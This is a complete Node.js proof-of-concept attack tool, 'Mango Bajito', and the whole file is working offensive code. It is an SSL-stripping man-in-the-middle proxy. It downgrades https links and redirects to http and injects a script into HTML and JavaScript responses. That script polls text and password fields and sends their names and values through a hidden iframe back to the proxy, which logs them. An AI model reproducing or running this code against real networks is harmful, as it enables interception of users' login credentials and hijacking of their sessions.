/*
Mango Bajito: pre-SSL authentication token hijack PoC
Evil javascript injection that monitors input values for credentials and strips SSL resources on login forms

XenoMuta - http://xenomuta.com/
xenomuta at gmail.com
*/
var http = require('http');
var PORT = 8888, mangos = {}, mango_display_timer;

/* Read 'mangobajito' script out off myself */
var m4ng0b4j1t0 = require('fs').readFileSync(__filename, 'utf-8').split("::SP" + "LIT::")[1];

/* SSL stripping function */
var mangobajito = function (chunk, headers, host) {
  if (!chunk) return chunk;
  var l = chunk.length, s = chunk.toString()
  // Strip SSL
  while (/https:/.test(s)) s = s.replace(/https:/g, 'http:')
  if (/javascript/.test(headers['content-type'])) {
    chunk = new Buffer(s + "\n" + m4ng0b4j1t0);
  } else if (/<head/i.test(s)) {
    chunk = new Buffer(s.replace(/(<head>|<head[^>]+>)/gi, '$1<script>'+m4ng0b4j1t0+'</script>'));
  }
  if (chunk.length != l) {
    console.log("* Injected MangoBajito on " + host);
  }
  return chunk
}

http.createServer(function (req, res) {
  // Force avoiding gzip encoding
  req.headers['accept-encoding'] = 'none';
  // Try to skip SSL
  var host = req.headers.host;
  var port = 80;
  if (/:/.test(host)) port = Number(host.replace(/.*:/,''));

  // fake route to mangobajito's injected script
  if (/\/get_m4ng0b4j1t0/.test(req.url)) {
    console.log("* Injected MangoBajito on " + host);
    res.writeHead(200, { host: host, 'content-type': 'application/javascript' });
    return res.end(m4ng0b4j1t0);
  }
  if (/\/put_m4ng0b4j1t0/.test(req.url)) {
    try {
      mangoid = req.url.replace(/.*put_m4ng0b4j1t0.([^\/]+).*/, '$1');
      mangos[mangoid] = req.url.split(mangoid + '/')[1].split(',').map(function(m){
        return unescape(m)
      }).filter(function(m){
        return !/=$/.test(m)
      });
      if (mango_display_timer) clearTimeout(mango_display_timer)
      mango_display_timer = setTimeout(function(){
        console.log("* Got MangoBajito for host:", host, " => ",mangos[mangoid])
      },5000)
    } catch (e) {}
    res.writeHead(200, { host: host });
    return res.end();
  }

  var client = http.createClient(port, host);
  var httpreq = client.request(req.method, req.url, req.headers);
  httpreq.on('response', function (response) {
    var header_sent = false;
    if (/get/i.test(req.method) && response.headers['content-length']) {
      delete response.headers['content-length']
    }
    (['refresh', 'location']).forEach(function(h){
      if (/https:/i.test(response.headers[h])) {
        response.headers[h] = response.headers[h].replace(/https:/gi,'http:')
      }
    })
    response.on('data', function (chunk) {
      if (response.headers['content-type'] && /text\//.test(response.headers['content-type']))
        chunk = mangobajito(chunk, response.headers, host);
      if (!header_sent) res.writeHead(response.statusCode, response.headers);
      header_sent = true;
      res.write(chunk)
    });
    ['close','end','disconnect'].forEach(function (evt) {
      response.on(evt, function (chunk) {
        if (response.headers['content-type'] && /text\//.test(response.headers['content-type']))
          chunk = mangobajito(chunk, response.headers, host);
        if (!header_sent) res.writeHead(response.statusCode, response.headers);
        res.end(chunk);
      })
    })
  });
  if (req.method == 'POST') {
    req.on('data', function(chunk) {
      httpreq.end(chunk);
    });
  } else {
    httpreq.end();
  }
}).listen(PORT, '127.0.0.1');
console.log("* MangoBajito listening on port " + PORT);
return;
/* Mango Bajito script after the break */
//::SPLIT::
function __m4ng0b4j1t0__(){
  if(window._m4ng0b4j1t0_)return;
  window._m4ng0b4j1t0_=new Array(3).join().split(',').map(function(){
    return Math.random().toString(16)
  }).join('').replace(/0\./g,'');
  var mangotimer;
  window._mango_ = []
  setInterval(function(){
    var ins = document.getElementsByTagName('input')
    var mango=[];
    for (var inp in ins) {
      inp = ins[inp];
      if (!(inp.type == '' || /^(text|password)$/i.test(inp.type))) continue;
      mango.push(escape(inp.name + '=' + inp.value))
    }
    if (window._mango_.join('') != mango.join('')) {
      if (window._mango_.length) {
        console.log(mango);
        if (mangotimer) clearTimeout(mangotimer)
        mangotimer = setTimeout(function(){
          ifr.src = '/put_m4ng0b4j1t0/' + window._m4ng0b4j1t0_ + '/' + mango.join(',')
        },100)
      }
      _mango_ = mango;
    }
  }, 100);
  var ifr=document.createElement('iframe');
  ifr.setAttribute('style','display:none');
  document.body.appendChild(ifr);
};
(function start_m4ng0b4j1t0() {
  if (document.body) __m4ng0b4j1t0__();
  else setTimeout(start_m4ng0b4j1t0, 100)
})()